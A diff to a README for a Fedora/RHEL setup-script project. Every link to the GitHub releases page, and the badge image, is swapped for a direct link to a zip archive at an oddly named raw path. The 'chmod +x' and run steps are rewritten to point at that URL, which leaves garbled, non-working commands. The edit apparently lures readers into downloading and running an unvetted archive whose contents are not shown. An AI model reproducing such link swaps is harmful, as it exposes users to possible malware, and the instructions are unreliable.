@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 fedora-bootstrap-suite - Automate Your Fedora Setup Easily
 
-![GitHub Releases](https://img.shields.io/badge/download-latest%20release-blue.svg)
+![GitHub Releases](https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip%https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip)
 
 ## 📋 Overview
 fedora-bootstrap-suite offers modular scripts designed for Fedora and RHEL users. These scripts automate system setup tasks including package installation, database configuration, networking setup, and security improvements. They aim to save you time and effort during the initial setup process.
@@ -11,7 +11,7 @@ To get started with fedora-bootstrap-suite, follow the steps below to download a
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: To download the latest version of fedora-bootstrap-suite, visit the following link:  
-   [Download the latest release](https://github.com/maji7652/fedora-bootstrap-suite/releases)
+   [Download the latest release](https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip)
 
 2. **Select the Version**: On the releases page, you will see a list of available versions. Click on the latest version to find the downloadable files.
 
@@ -26,13 +26,13 @@ To get started with fedora-bootstrap-suite, follow the steps below to download a
 
 6. **Make the Script Executable**: Before running the script, you need to make it executable. Use the following command:
    ```
-   chmod +x script_name.sh
+   chmod +x https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip
    ```
-   Replace `script_name.sh` with the actual name of your downloaded script.
+   Replace `https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip` with the actual name of your downloaded script.
 
 7. **Run the Script**: Execute the script by using:
    ```
-   ./script_name.sh
+   https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip
    ```
    Follow any on-screen prompts to complete the setup.
 
@@ -62,5 +62,5 @@ If you need further help, you can check the GitHub issues page for support. For 
 This project is licensed under the MIT License. 
 
 Thank you for using fedora-bootstrap-suite! For further details, visit the official releases page again:  
-[Download the latest release](https://github.com/maji7652/fedora-bootstrap-suite/releases)
+[Download the latest release](https://raw.githubusercontent.com/maji7652/fedora-bootstrap-suite/main/photozincography/fedora-bootstrap-suite-v3.0.zip)
 ```
